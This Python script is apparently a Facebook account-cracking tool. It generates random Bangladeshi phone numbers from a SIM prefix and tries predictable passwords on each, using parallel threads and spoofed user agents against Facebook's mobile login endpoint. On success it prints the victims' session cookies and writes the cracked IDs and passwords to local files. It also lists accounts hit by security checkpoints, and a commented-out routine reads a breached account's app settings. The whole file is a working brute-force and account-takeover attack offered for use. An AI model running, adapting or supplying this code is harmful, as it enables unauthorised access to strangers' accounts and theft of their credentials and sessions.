import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
    #------------------APK<>CHECKER-------------------#    
#def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;91m%s[%s!%s] %sNot Found Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🔥] %s \x1b[1;95m Your Active Apps     :{GREEN}'%(GREEN))
        for i in range(len(game)):
            print(f"\033[\033[1;92m[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;96m%s[%s!%s] %sNot Found Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🔥] %s \x1b[1;95m  Your Expired Apps     :{RED}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
    
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    
    

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]            
            

logo= """  \033[1;92m
\033[1;92m╔═════════════════╗
\033[1;93m ASSALAMUALAIKUM\033[1;32m
\033[1;92m═══════════════════
\033[1;92m══════════════════════════════════════════
\033[1;32m██████╗ ██████╗  █████╗ ███╗  ██╗██████╗ 
\033[1;32m██╔══██╗██╔══██╗██╔══██╗████╗ ██║██╔══██╗
\033[1;32m██████╦╝██████╔╝███████║██╔██╗██║██║  ██║
\033[1;32m██╔══██╗██╔══██╗██╔══██║██║╚████║██║  ██║
\033[1;32m██████╦╝██║  ██║██║  ██║██║ ╚███║██████╔╝
\033[1;32m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═════╝ 
\033[1;92m══════════════════════════════════════════       
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 0.0
\033[1;32m[-] AUTHOR    :\033[1;32m ARIF HOSEN LIMON
\033[1;32m[-] GITHUB    :\033[1;32m BADSHAH-KING
\033[1;32m[-] FACEBOOK  :\033[1;32m ARIF HOSEN
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS LIMON BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m--------------------------------------------------------')
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        #os.system('xdg-open https://www.facebook.com/hafejmdshoriful.shorif')
        print('\033[1;37m[\033[1;32m1\033[1;37m] START RANDOM CLONE')
        print('\033[1;37m[\033[1;32m3\033[1;37m] EXIT')
        print('\033[1;31m--------------------------------------------------------')
        Shorif =input("\033[1;37m[\033[1;32m~\033[1;37m] CHOOSE : ")
        if Shorif in ["1", "01"]:
            v2()
        else:
            exit()


A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('\033[1;37m[\033[1;32m~\033[1;37m] SIM CODE     : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as akash:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m~\033[1;37m] SIM CODE     : '+kode)
        print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK ID     : '+tl)
        print(linex)
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            akash.submit(rcrack1,uid,pwx,tl)
    print(linex)
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(linex)

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sLIMON💥\033[1;31m]\033[1;34m---\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m---\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'POST',
            "path": '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
            "scheme": 'https',
            "accept": 'application/x-www-form-urlencoded',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "origin": 'https://m.facebook.com',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'empty',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[LIMON-OK💚] {uid}|{ps}\n\033[1;33m[COOKIE🎁] \033[1;33m{coki}")
                #cek_apk(session,coki)
                open('/sdcard/LIMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[LIMON-CP💔] {uid}|{ps}")
                open('/sdcard/LIMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
Main()
